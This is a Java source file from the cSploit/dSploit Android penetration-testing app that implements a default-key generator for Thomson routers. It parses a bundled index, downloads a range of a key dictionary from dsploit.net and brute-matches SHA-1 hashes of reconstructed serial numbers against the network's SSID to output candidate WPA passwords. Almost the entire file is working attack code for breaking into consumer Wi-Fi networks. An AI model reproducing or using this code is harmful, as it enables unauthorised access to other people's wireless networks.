/*
 * This file is part of the dSploit.
 *
 * Copyleft of Simone Margaritelli aka evilsocket <evilsocket@gmail.com>
 *
 * dSploit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * dSploit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with dSploit.  If not, see <http://www.gnu.org/licenses/>.
 */
package org.csploit.android.wifi.algorithms;

import java.io.DataInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;
import java.net.URL;
import java.net.URLConnection;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.List;
import java.util.zip.ZipInputStream;

import org.csploit.android.R;
import org.csploit.android.core.System;
import org.csploit.android.wifi.Keygen;

public class ThomsonKeygen extends Keygen{
  final private byte[] cp = new byte[12];
  private byte[] entry;
  final private byte[] table = new byte[1282];
  private int a, b, c;
  private int year;
  private int week;
  private int sequenceNumber;
  final private byte[] routerESSID = new byte[3];
  private boolean internetAlgorithm;

  private boolean errorDict;
  private int len = 0;

  private MessageDigest md;
  final private String ssidIdentifier;
  private InputStream webdic;

  public ThomsonKeygen(String ssid, String mac, int level, String enc){
    super(ssid, mac, level, enc);
    this.errorDict = false;
    this.ssidIdentifier = ssid.substring(ssid.length() - 6);
    this.webdic = System.getRawResource(R.raw.webdic);
    this.internetAlgorithm = true;
  }

  @Override
  public List<String> getKeys(){
    try{
      md = MessageDigest.getInstance("SHA1");
    } catch(NoSuchAlgorithmException e1){
      setErrorMessage("This phone cannot process a SHA1 hash.");
      return null;
    }
    if(ssidIdentifier.length() != 6){
      setErrorMessage("Invalid ESSID! It must have 6 characters.");
      return null;
    }

    for(int i = 0; i < 6; i += 2)
      routerESSID[i / 2] = (byte) ((Character.digit(
        ssidIdentifier.charAt(i), 16) << 4) + Character.digit(
        ssidIdentifier.charAt(i + 1), 16));

    if(!internetCalc())
      return null;

    if(getResults().size() == 0){
      setErrorMessage("No matches were found.");
      return null;
    }
    return getResults();
  }

  private boolean internetCalc(){
    try{
      DataInputStream onlineFile = null;
      int lenght = 0;
      URL url;
      ZipInputStream fis = new ZipInputStream(webdic);
      fis.getNextEntry();
      int check = 0, ret = 0;
      while(check != 1024)/* ZipInputStream doens't seems to block. */{
        ret = fis.read(table, check, 1024 - check);
        if(ret == -1){
          setErrorMessage("Error while processing online keys.");
          errorDict = true;
          return false;
        } else
          check += ret;
      }
      int totalOffset = 0;
      int offset = 0;
      int lastLength = 0;
      int i = (0xFF & routerESSID[0]) * 4;
      offset = ((0xFF & table[i]) << 24) | ((0xFF & table[i + 1]) << 16)
        | ((0xFF & table[i + 2]) << 8) | (0xFF & table[i + 3]);
      if(i != 1020) // routerESSID[0] != 0xFF ( 255*4 == 1020 )
        lastLength = ((0xFF & table[i + 4]) << 24)
          | ((0xFF & table[i + 5]) << 16)
          | ((0xFF & table[i + 6]) << 8) | (0xFF & table[i + 7]);
      totalOffset += offset;
      long checkLong = 0, retLong;
      while(checkLong != (i / 4) * 768)/*
                                             * ZipInputStream doens't seems to
											 * block.
											 */{
        retLong = fis.skip((i / 4) * 768 - checkLong);
        if(retLong == -1){
          setErrorMessage("Error while processing online keys.");
          errorDict = true;
          return false;
        } else
          checkLong += retLong;
      }
      check = 0;
      while(check != 768){
        ret = fis.read(table, check, 768 - check);
        if(ret == -1){
          setErrorMessage("Error while processing online keys.");
          errorDict = true;
          return false;
        } else
          check += ret;
      }
      i = (0xFF & routerESSID[1]) * 3;
      offset = ((0xFF & table[i]) << 16) | ((0xFF & table[i + 1]) << 8)
        | (0xFF & table[i + 2]);
            /*
             * There's no check here because humans are lazy people and because
			 * it doesn't matter
			 */
      lenght = ((0xFF & table[i + 3]) << 16)
        | ((0xFF & table[i + 4]) << 8) | (0xFF & table[i + 5]);
      totalOffset += offset;
      lenght -= offset;
      if((lastLength != 0) && ((0xFF & routerESSID[1]) == 0xFF)){
        /*
         * Only for SSID starting with XXFF. We use the next item on the
				 * main table to know the length of the sector we are looking
				 * for.
				 */
        lastLength -= totalOffset;
        lenght = lastLength;
      }
      if(((0xFF & routerESSID[0]) == 0xFF)
        && ((0xFF & routerESSID[1]) == 0xFF)){
				/*
				 * Only for SSID starting with FFFF as we don't have a marker of
				 * the end.
				 */
        lenght = 2000;
      }
      url = new URL("http://www.dsploit.net/files/RKDictionary.dic");
      URLConnection con = url.openConnection();
      con.setRequestProperty("Range", "bytes=" + totalOffset + "-");
      onlineFile = new DataInputStream(con.getInputStream());
      len = 0;
      this.entry = new byte[lenght];
      if((len = onlineFile.read(this.entry, 0, lenght)) != -1){
        lenght = len;
      }

      onlineFile.close();
      fis.close();
      return thirdDic();
    } catch(IOException e){
      setErrorMessage("Error while processing online keys.");
      errorDict = true;
      return false;
    }
  }

  static{
    java.lang.System.loadLibrary("thomson");
  }

  private native String[] thirdDicNative(byte[] essid, byte[] entry, int size);

  // This has been implemented natively for instant resolution!
  private boolean thirdDic(){
    String[] results;
    try{
      results = this.thirdDicNative(routerESSID, entry, entry.length);
    } catch(Exception e){
      setErrorMessage("Error in the Native Calculation.Please inform the team.");
      return false;
    } catch(LinkageError e){
      setErrorMessage("Your APK was not correctly build. Please remember to build the native part first.");
      return false;
    }
    if(isStopRequested())
      return false;
    for(int i = 0; i < results.length; ++i)
      addPassword(results[i]);
    return true;
  }

  private void forthDic(){
    cp[0] = (byte) (char) 'C';
    cp[1] = (byte) (char) 'P';
    for(int offset = 0; offset < len; offset += 3){
      for(int i = 0; i <= 1; ++i){
        if(isStopRequested())
          return;
        sequenceNumber = i
          + (((0xFF & entry[offset + 0]) << 16)
          | ((0xFF & entry[offset + 1]) << 8) | (0xFF & entry[offset + 2]))
          * 2;
        c = sequenceNumber % 36;
        b = sequenceNumber / 36 % 36;
        a = sequenceNumber / (36 * 36) % 36;
        year = sequenceNumber / (36 * 36 * 36 * 52) + 4;
        week = (sequenceNumber / (36 * 36 * 36)) % 52 + 1;
        cp[2] = (byte) Character.forDigit((year / 10), 10);
        cp[3] = (byte) Character.forDigit((year % 10), 10);
        cp[4] = (byte) Character.forDigit((week / 10), 10);
        cp[5] = (byte) Character.forDigit((week % 10), 10);
        cp[6] = charectbytes0[a];
        cp[7] = charectbytes1[a];
        cp[8] = charectbytes0[b];
        cp[9] = charectbytes1[b];
        cp[10] = charectbytes0[c];
        cp[11] = charectbytes1[c];
        md.reset();
        md.update(cp);
        final byte[] hash = md.digest();
        if(hash[19] != routerESSID[2])
          continue;
        if(hash[18] != routerESSID[1])
          continue;
        if(hash[17] != routerESSID[0])
          continue;

        try{
          addPassword(getHexString(hash).substring(0, 10)
            .toUpperCase());
        } catch(UnsupportedEncodingException e){
          e.printStackTrace();
        }
      }
    }
  }

  private void secondDic(){
    cp[0] = (byte) (char) 'C';
    cp[1] = (byte) (char) 'P';
    for(int offset = 0; offset < len; offset += 3){
      if(isStopRequested())
        return;
      sequenceNumber = ((0xFF & entry[offset + 0]) << 16)
        | ((0xFF & entry[offset + 1]) << 8)
        | (0xFF & entry[offset + 2]);
      c = sequenceNumber % 36;
      b = sequenceNumber / 36 % 36;
      a = sequenceNumber / (36 * 36) % 36;
      year = sequenceNumber / (36 * 36 * 36 * 52) + 4;
      week = (sequenceNumber / (36 * 36 * 36)) % 52 + 1;
      cp[2] = (byte) Character.forDigit((year / 10), 10);
      cp[3] = (byte) Character.forDigit((year % 10), 10);
      cp[4] = (byte) Character.forDigit((week / 10), 10);
      cp[5] = (byte) Character.forDigit((week % 10), 10);
      cp[6] = charectbytes0[a];
      cp[7] = charectbytes1[a];
      cp[8] = charectbytes0[b];
      cp[9] = charectbytes1[b];
      cp[10] = charectbytes0[c];
      cp[11] = charectbytes1[c];
      md.reset();
      md.update(cp);
      final byte[] hash = md.digest();
      if(hash[19] != routerESSID[2])
        continue;
      if(hash[18] != routerESSID[1])
        continue;
      if(hash[17] != routerESSID[0])
        continue;

      try{
        addPassword(getHexString(hash).substring(0, 10)
          .toUpperCase());
      } catch(UnsupportedEncodingException e){
        e.printStackTrace();
      }
    }
  }

  private void firstDic(){
    cp[0] = (byte) (char) 'C';
    cp[1] = (byte) (char) 'P';
    for(int offset = 0; offset < len; offset += 4){
      if(isStopRequested())
        return;

      if(entry[offset] != routerESSID[2])
        continue;
      sequenceNumber = ((0xFF & entry[offset + 1]) << 16)
        | ((0xFF & entry[offset + 2]) << 8)
        | (0xFF & entry[offset + 3]);
      c = sequenceNumber % 36;
      b = sequenceNumber / 36 % 36;
      a = sequenceNumber / (36 * 36) % 36;
      year = sequenceNumber / (36 * 36 * 36 * 52) + 4;
      week = (sequenceNumber / (36 * 36 * 36)) % 52 + 1;
      cp[2] = (byte) Character.forDigit((year / 10), 10);
      cp[3] = (byte) Character.forDigit((year % 10), 10);
      cp[4] = (byte) Character.forDigit((week / 10), 10);
      cp[5] = (byte) Character.forDigit((week % 10), 10);
      cp[6] = charectbytes0[a];
      cp[7] = charectbytes1[a];
      cp[8] = charectbytes0[b];
      cp[9] = charectbytes1[b];
      cp[10] = charectbytes0[c];
      cp[11] = charectbytes1[c];
      md.reset();
      md.update(cp);
      final byte[] hash = md.digest();

      try{
        addPassword(getHexString(hash).substring(0, 10)
          .toUpperCase());
      } catch(UnsupportedEncodingException e){
        e.printStackTrace();
      }
    }
  }

  public boolean isErrorDict(){
    return errorDict;
  }

  final private static byte[] charectbytes0 = {'3', '3', '3', '3', '3', '3',
    '3', '3', '3', '3', '4', '4', '4', '4', '4', '4', '4', '4', '4',
    '4', '4', '4', '4', '4', '4', '5', '5', '5', '5', '5', '5', '5',
    '5', '5', '5', '5',};

  final private static byte[] charectbytes1 = {'0', '1', '2', '3', '4', '5',
    '6', '7', '8', '9', '1', '2', '3', '4', '5', '6', '7', '8', '9',
    'A', 'B', 'C', 'D', 'E', 'F', '0', '1', '2', '3', '4', '5', '6',
    '7', '8', '9', 'A',};
}
